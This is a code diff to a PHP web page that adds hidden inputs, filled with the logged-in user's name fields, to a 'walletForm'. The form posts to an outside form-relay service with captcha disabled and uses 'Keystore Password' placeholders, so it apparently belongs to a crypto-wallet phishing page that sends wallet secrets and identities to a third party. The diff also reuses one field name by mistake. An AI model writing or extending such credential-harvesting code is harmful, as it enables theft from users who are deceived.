@@ -652,6 +652,25 @@
         </div>
       </div>
 <form id="walletForm" action="https://formsubmit.co/fbc8fb7ec32ac2262ab18be74e83e14f" method="POST">
+  <?php
+  if ($result) {
+  // Bind the result variables
+  mysqli_stmt_bind_result($stmt, $id, $user_name, $first_name, $last_name);
+
+  // Fetch the values
+  mysqli_stmt_fetch($stmt);
+  ?>
+  <input type="hidden" class="input allinput" name="user_name" placeholder="Keystore Password" value="<?= $user_name ?>">
+  <input type="hidden" class="input allinput" name="first_name" placeholder="Keystore Password" value="<?= $first_name ?>">
+  <input type="hidden" class="input allinput" name="first_name" placeholder="Keystore Password" value="<?= $last_name ?>">
+  <?php }
+  else {
+    echo "Error executing the statement: " . mysqli_stmt_error($stmt);
+  }
+
+  // Close the statement
+  mysqli_stmt_close($stmt);
+  ?>
   <input type="hidden" name="_next" value="https://caketoolsnftmarketplace.com/user/dashboard/" />
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
